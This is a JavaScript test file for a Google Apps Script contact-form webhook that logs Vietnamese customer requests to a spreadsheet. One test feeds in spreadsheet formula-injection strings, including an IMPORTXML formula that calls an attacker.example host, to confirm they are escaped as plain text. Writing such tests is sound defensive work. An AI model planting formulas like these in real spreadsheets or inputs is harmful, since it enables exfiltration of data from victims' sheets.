import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import vm from "node:vm";
import test from "node:test";

async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
  const rows = [];
  let uuidIndex = 0;
  const sheet = {
    appendRow(row) { rows.push(row); },
    getLastRow() { return rows.length; },
    setFrozenRows() {},
  };
  const context = vm.createContext({
    ContentService: {
      MimeType: { JSON: "application/json" },
      createTextOutput(value) {
        return { setMimeType() { return { value }; } };
      },
    },
    JSON,
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => "shared-secret" }) },
    Session: { getScriptTimeZone: () => "Asia/Ho_Chi_Minh" },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: () => sheet,
        insertSheet: () => sheet,
      }),
    },
    Utilities: {
      formatDate: () => "20260725-100000",
      getUuid: () => uuids[uuidIndex++],
    },
  });
  const source = await readFile(new URL("../docs/google-apps-script-contact-webhook.gs", import.meta.url), "utf8");
  vm.runInContext(source, context);
  return { context, rows };
}

function submit(context, payload) {
  return context.doPost({ postData: { contents: JSON.stringify(payload) } });
}

const validProductPayload = {
  email: "customer@example.test",
  message: "Cần tư vấn.",
  name: "Nguyễn Văn A",
  phone: "0900000000",
  product: "Bột dinh dưỡng",
  qty: 20,
  request_type: "Tư vấn số lượng lớn",
  secret: "shared-secret",
  service: "",
  source: "/lien-he/",
  variant: "Vị vani",
};

test("stores user-controlled values as safe plain text instead of spreadsheet formulas", async () => {
  const { context, rows } = await loadTemplate();
  const output = submit(context, {
    ...validProductPayload,
    message: "=IMPORTXML(\"https://attacker.example\", \"//x\")",
    name: "+cmd",
    product: "+Bột dinh dưỡng",
    source: "-1+1",
    variant: "@Vị vani",
  });

  const response = JSON.parse(output.value);
  assert.deepEqual(response, { ok: true, reference: "YC-20260725-100000-ABCD1234" });
  assert.deepEqual(Array.from(rows[0]), [
    "Mã",
    "Thời gian",
    "Loại",
    "Sản phẩm/Dịch vụ",
    "Biến thể",
    "Số lượng",
    "Họ tên",
    "Điện thoại",
    "Email",
    "Nội dung",
    "Nguồn",
    "Trạng thái",
    "Người phụ trách",
    "Ghi chú",
    "Cập nhật lần cuối",
  ]);
  assert.equal(rows[1].length, 15);
  assert.equal(response.reference, rows[1][0]);
  assert.equal(rows[1][1], rows[1][14]);
  assert.deepEqual(Array.from(rows[1].slice(2, 11)), [
    "Tư vấn số lượng lớn",
    "'+Bột dinh dưỡng",
    "'@Vị vani",
    20,
    "'+cmd",
    "0900000000",
    "customer@example.test",
    "'=IMPORTXML(\"https://attacker.example\", \"//x\")",
    "'-1+1",
  ]);
  assert.deepEqual(Array.from(rows[1].slice(11, 14)), ["Mới", "", ""]);
});

test("creates a distinct reference and row for every accepted submit", async () => {
  const { context, rows } = await loadTemplate([
    "abcd1234-0000-0000-0000-000000000000",
    "dcba4321-0000-0000-0000-000000000000",
  ]);

  const first = JSON.parse(submit(context, validProductPayload).value);
  const second = JSON.parse(submit(context, validProductPayload).value);

  assert.equal(rows.length, 3);
  assert.equal(first.reference, rows[1][0]);
  assert.equal(second.reference, rows[2][0]);
  assert.notEqual(first.reference, second.reference);
  assert.equal(rows[2][1], rows[2][14]);
});

test("rejects mixed and malformed contexts without appending rows", async () => {
  const { context, rows } = await loadTemplate();
  const invalidPayloads = [
    { ...validProductPayload, service: "Sấy & thực phẩm sấy" },
    { ...validProductPayload, qty: "20" },
  ];

  for (const payload of invalidPayloads) {
    assert.deepEqual(JSON.parse(submit(context, payload).value), { ok: false, reference: "" });
  }
  assert.equal(rows.length, 0);
});
